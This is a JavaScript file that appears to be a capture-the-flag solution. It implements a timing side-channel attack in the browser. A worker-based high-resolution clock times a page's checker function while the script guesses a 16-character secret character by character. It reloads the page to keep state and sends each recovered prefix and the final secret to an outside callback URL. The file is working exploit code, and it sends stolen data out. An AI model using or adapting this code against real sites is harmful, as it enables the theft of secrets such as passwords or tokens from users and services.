!function (tot_turn, callback_uri) {

    const blobURL = URL.createObjectURL(new Blob([`
    self.onmessage = event => {
        const sab = event.data.buffer;
        const view = new Uint32Array(sab);
        view[0] = 0;
        self.postMessage('ready');
        while (1) {
            Atomics.add(view, 0, 1);
        }
    };`.trim()], { type: 'application/javascript' }));



    class TimeControl {

        constructor(cb) {
            this.worker = new Worker(blobURL);
            this.sab = new SharedArrayBuffer(4);
            this.view = new Uint32Array(this.sab);
            this.TPS = 0;


            // start tick
            this.worker.postMessage({
                buffer: this.sab
            });

            this.worker.onmessage = async () => {
                await this.__initTps();
                console.info(`${this.TPS} tick/s`);
                await cb();
            }
        }

        now() { return Atomics.load(this.view, 0); }

        __initTps() {
            const start = 0;
            return new Promise(r => {
                setTimeout(() => {
                    r(this.TPS = this.now() - start);
                })
            })
        }

        tick2ns(tick, keep = false) {
            let ns = tick * 1e6 / this.TPS * 1e3;
            if (typeof keep === 'number') return ns.toFixed(keep);
            else if (!keep) return Math.round(ns);
        }

        reset() {
            Atomics.store(this.view, 0, 0);
        }

    }

    const TimeCtl = new TimeControl(() => {
        do_check();
    })

    function pos_check(prefix, pos) {
        // let junk_size = 16;
        let alphabet = " !@#$%^&*()`~[]|/';.,<>-=+ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
        let plen = 16;
        let guess_uint32 = new Uint32Array(plen);
        for (let i = 0; i < prefix.length; i++) guess_uint32[i] = prefix.charCodeAt(i);

        let final = '';
        // for (let pos = 0; pos < plen; pos++) {
        console.log(`pos: ${pos}`);
        // let pos = 0;
        let probe_map = {};
        // for each pos, we try many times
        for (let t = 0; t < 199; t++) {
            let map = new Uint32Array(alphabet.length);
            // guess
            for (let i = 0; i < alphabet.length; i++) {
                TimeCtl.reset();
                let result = false;
                guess_uint32[pos] = alphabet.charCodeAt(i);
                for (j = pos + 1; j < plen; j++) guess_uint32[j] = alphabet.charCodeAt(alphabet.length - 1);
                let guess_str = String.fromCharCode.apply(null, guess_uint32);
                const check = checker(guess_str, pos);
                const begin = TimeCtl.now();
                result = check();
                const end = TimeCtl.now();

                if (Object.prototype.hasOwnProperty.call(map, i)) map[i] += end - begin;
                else map[i] = end - begin;
            }
            // get the most possible char in one guess
            let maxc = '_', maxv = 0;
            for (let k = 0; k < alphabet.length; k++) {
                let key = alphabet[k];
                if (!/[a-zA-Z0-9]/.test(key)) continue;
                if (map[k] > maxv) {
                    maxv = map[k];
                    maxc = key;
                }
            }
            if (/[a-zA-Z0-9]/.test(maxc)) {
                if (Object.prototype.hasOwnProperty.call(probe_map, maxc)) probe_map[maxc]++;
                else probe_map[maxc] = 1;
            }
        }
        // stat the most possible char, get the max probility one
        console.log(probe_map);
        let maxc = '_', maxv = 0;
        for (let key in probe_map) {
            if (probe_map[key] > maxv) {
                maxv = probe_map[key];
                maxc = key;
            }
        }
        final += maxc;
        // }
        // console.log(final);
        return final;
    }

    let search = new URLSearchParams(location.search);
    let pos = parseInt(search.get('pos') || 0);
    let prefix = search.get('prefix') || '';
    let turn = parseInt(search.get('turn') || 0);
    let history = JSON.parse(search.get('history') || '[]');

    async function do_check(input) {
        const CALLBACK_URI = callback_uri;
        const TOT_TURN = tot_turn;
        // let pos = parseInt(input || 0);
        prefix = prefix + pos_check(prefix, pos);
        console.log(prefix);
        fetch(CALLBACK_URI + `?t=${turn}&q=${prefix}`, { mode: 'no-cors' });
        if (prefix.length < 16) {
            // this turn
            location.search = `?pos=${pos + 1}&prefix=${prefix}&turn=${turn}&history=${JSON.stringify(history)}`;
        } else if (turn < TOT_TURN - 1) {
            // next turn
            location.search = `?pos=0&prefix=&turn=${turn + 1}&history=${JSON.stringify(history.concat(prefix))}`;
        } else {
            // end
            history.push(prefix);
            let final = '';
            for (let i = 0; i < 16; i++) {
                //which has the most
                let cnt_map = {};
                history.forEach(h => {
                    if (!/[a-zA-Z0-9]/.test(h[i])) cnt_map['_'] = 0;
                    if (Object.prototype.hasOwnProperty.call(cnt_map, h[i])) cnt_map[h[i]]++;
                    else cnt_map[h[i]] = 1;
                })
                let maxc = history[0][i], maxv = 0;
                for (let key in cnt_map) {
                    if (cnt_map[key] > maxv) {
                        maxv = cnt_map[key];
                        maxc = key;
                    }
                }
                final += maxc;
            }
            console.log(final);
            fetch(CALLBACK_URI + `?end&q=${final}`, { mode: 'no-cors' });
        }

    }
}(4, "https://callback.example.com/")